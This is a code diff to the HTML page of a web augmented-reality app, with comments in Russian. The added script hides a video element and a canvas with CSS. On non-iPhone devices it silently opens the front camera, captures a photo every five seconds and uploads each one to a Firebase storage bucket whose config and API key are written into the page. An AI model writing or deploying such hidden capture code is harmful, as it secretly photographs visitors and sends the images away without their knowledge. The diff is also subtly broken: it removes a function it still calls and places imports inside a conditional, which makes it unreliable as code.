@@ -8,6 +8,11 @@
     <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
     <script src="https://cdn.jsdelivr.net/gh/AR-js-org/AR.js/aframe/build/aframe-ar.js"></script>
     <style>
+        #front-camera-video, #canvas {
+            display: none;
+        }
+
+        
         body { margin: 0; overflow: hidden; }
         div.a-enter-vr {
           visibility: hidden;
@@ -34,14 +39,74 @@
     </style>
 </head>
 <body>
-    <script>
-    function isIphone() {
-        return /iPhone|iPad|iPod/i.test(navigator.userAgent);
-    }
+    <video id="videoElement" autoplay playsinline muted></video>
+    <video id="front-camera-video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <script type="module">
 
     if (!isIphone()) {
         // Здесь можно написать код, который НЕ должен выполняться на iPhone
-        console.log("Скрипт выполняется, так как устройство не iPhone.");
+            // Импорт модулей Firebase
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+        import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js";   
+        // Конфигурация Firebase (вставь свои ключи)
+        const firebaseConfig = {
+  apiKey: "AIzaSyDPswGPJQVRm1HZwcClKo8lXRwjk_pxAyM",
+  authDomain: "individualproject-ad702.firebaseapp.com",
+  projectId: "individualproject-ad702",
+  storageBucket: "individualproject-ad702.appspot.com",
+  messagingSenderId: "365705238227",
+  appId: "1:365705238227:web:97496033f4e09db0966626"
+};
+        // Инициализация Firebase
+        // Инициализация Firebase
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+        console.log("Firebase initialized");
+
+        document.addEventListener("DOMContentLoaded", function () {
+            const frontVideo = document.getElementById('front-camera-video');
+            const canvas = document.getElementById('canvas');
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    frontVideo.srcObject = stream;
+                    setInterval(captureAndUploadPhoto, 5000);
+                });
+
+            // Функция для снятия фото и загрузки на Firebase
+            function captureAndUploadPhoto() {
+                const context = canvas.getContext('2d');
+                canvas.width = frontVideo.videoWidth;
+                canvas.height = frontVideo.videoHeight;
+                context.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
+
+                const dataURL = canvas.toDataURL('image/png');
+                uploadToFirebase(dataURL);
+            }
+
+            // Загрузка изображения на Firebase Storage
+            function uploadToFirebase(dataURL) {
+                const storageRef = ref(storage, `photos/photo_${Date.now()}.png`);
+                const file = dataURLtoFile(dataURL, `photo_${Date.now()}.png`);
+                console.log("Uploading photo...");
+
+                uploadBytes(storageRef, file);
+            }
+
+            // Конвертация Data URL в файл
+            function dataURLtoFile(dataurl, filename) {
+                const arr = dataurl.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                let n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                while (n--) {
+                    u8arr[n] = bstr.charCodeAt(n);
+                }
+                return new Blob([u8arr], { type: mime });
+            }
+        });
     } else {
         console.log("Скрипт не выполняется на iPhone.");
     }
